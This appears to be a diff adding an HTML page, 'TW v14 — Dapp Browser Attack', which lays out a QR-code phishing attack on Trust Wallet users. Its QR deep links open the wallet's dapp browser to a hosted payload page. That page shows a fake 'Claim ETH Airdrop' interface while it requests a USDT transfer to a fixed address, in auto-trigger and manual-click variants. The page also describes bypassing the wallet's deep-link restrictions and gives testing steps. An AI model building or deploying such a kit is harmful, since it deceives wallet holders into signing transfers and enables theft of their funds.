@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW v14 — Dapp Browser Attack</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 800px; margin: 0 auto; }
+    h1 { font-size: 22px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 13px; color: #8b949e; margin-bottom: 16px; }
+    .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .card h2 { font-size: 15px; margin-bottom: 8px; }
+    .card p, .card li { font-size: 12px; color: #c9d1d9; line-height: 1.5; }
+    .card code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; word-break: break-all; }
+    .highlight { border: 2px solid #f0883e; }
+    .qr-row { text-align: center; margin: 12px 0; }
+    .qr-row img { width: 220px; height: 220px; background: white; padding: 10px; border-radius: 12px; }
+    .uri-box { font-size: 10px; color: #484f58; word-break: break-all; background: #0d1117; padding: 10px; border-radius: 6px; margin: 10px 0; font-family: monospace; border: 1px solid #21262d; }
+    ol { margin-left: 20px; }
+    ol li { margin-bottom: 6px; color: #e6edf3; }
+    .green { color: #3fb950; }
+    .red { color: #ff6b6b; }
+    .yellow { color: #d29922; }
+  </style>
+</head>
+<body>
+  <h1>🔬 v14 — Dapp Browser Attack</h1>
+  <p class="subtitle">Fallback if EIP-681 data override is blocked — uses trust://browser + Web3 eth_sendTransaction</p>
+
+  <div class="card highlight">
+    <h2>⚡ How This Works</h2>
+    <p>
+      EIP-681 deep links with <code>data</code> param appear to be stripped by modern Trust Wallet (erc20_transfer has no data field).
+      <strong>New angle:</strong> <code>trust://browser?url=...</code> opens Trust Wallet's built-in dapp browser. The loaded dapp page
+      uses <code>window.ethereum.request({method: 'eth_sendTransaction', ...})</code> to send raw transactions with full control over <code>data</code>.
+    </p>
+    <p style="margin-top: 8px;">
+      <strong>Trick:</strong> The dapp shows fake UI ("Claim 0.1 ETH Airdrop") but requests a USDT transfer transaction.
+      The wallet confirmation screen shows the REAL transaction (to: USDT, data: transfer 4 USDT), bypassing the deep link parser entirely.
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>Test A ⭐ — Auto-trigger dapp attack</h2>
+    <p>QR opens dapp browser → loads dapp → dapp auto-requests <code>eth_sendTransaction</code> with <code>to=0xUSDT, data=transfer(RCP, 4M)</code></p>
+    <div class="qr-row">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=trust%3A%2F%2Fbrowser%3Furl%3Dhttps%3A%2F%2Fraw.githubusercontent.com%2Fstrystark-hash%2Ftw-qr-attack-test-suite%2Fmain%2Fdapp-payload.html" alt="QR A" loading="lazy">
+    </div>
+    <div class="uri">trust://browser?url=https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/dapp-payload.html</div>
+    <p style="font-size: 12px;">
+      📱 Dapp shows: <span class="yellow">"💰 0.5 ETH Airdrop — Claim Now"</span><br>
+      📱 Wallet shows: <span class="green">Contract Interaction → 0xUSDT, data visible</span><br>
+      ⚡ Executes: <span class="red">transfer(0xbc74daC..., 4 USDT)</span>
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>Test B — Manual click dapp attack</h2>
+    <p>Same as A but dapp requires user to click a button (avoids potential auto-trigger blocks)</p>
+    <div class="qr-row">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=trust%3A%2F%2Fbrowser%3Furl%3Dhttps%3A%2F%2Fraw.githubusercontent.com%2Fstrystark-hash%2Ftw-qr-attack-test-suite%2Fmain%2Fdapp-payload.html%3Fmode%3Dmanual" alt="QR B" loading="lazy">
+    </div>
+    <div class="uri">trust://browser?url=https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/dapp-payload.html?mode=manual</div>
+    <p style="font-size: 12px;">
+      📱 Dapp shows: <span class="yellow">"Claim" button → click → requests TX</span><br>
+      📱 Wallet shows: <span class="green">Full transaction details</span><br>
+      ⚡ Executes: <span class="red">transfer(0xbc74daC..., 4 USDT)</span>
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>Test C — EIP-681 to browser redirect (hybrid)</h2>
+    <p>Direct EIP-681 URI with data but redirected via dapp browser to bypass deep link restrictions</p>
+    <div class="qr-row">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=trust%3A%2F%2Fbrowser%3Furl%3Dhttps%3A%2F%2Fraw.githubusercontent.com%2Fstrystark-hash%2Ftw-qr-attack-test-suite%2Fmain%2Fdapp-payload.html%3Fmode%3Dv13test" alt="QR C" loading="lazy">
+    </div>
+    <div class="uri">&nbsp;</div>
+  </div>
+
+  <div class="card">
+    <h2>📋 Testing Method</h2>
+    <ol>
+      <li><strong>Scan QR with built-in camera</strong> (top-right icon)</li>
+      <li>Trust Wallet should open its built-in dapp browser</li>
+      <li>The dapp page loads and shows a fake "Claim Airdrop" interface</li>
+      <li><strong>Test B only:</strong> Tap the "Claim 0.5 ETH" button</li>
+      <li>Wallet shows a transaction confirmation screen</li>
+      <li><strong>Critical: Read what the wallet shows BEFORE confirming</strong></li>
+      <li>If it shows "USDT Transfer" or "Contract Interaction" to 0xUSDT address — that means data is passing through!</li>
+      <li>Report: Does the dapp browser load? What does the wallet show? Does confirm work?</li>
+    </ol>
+  </div>
+
+</body>
+</html>
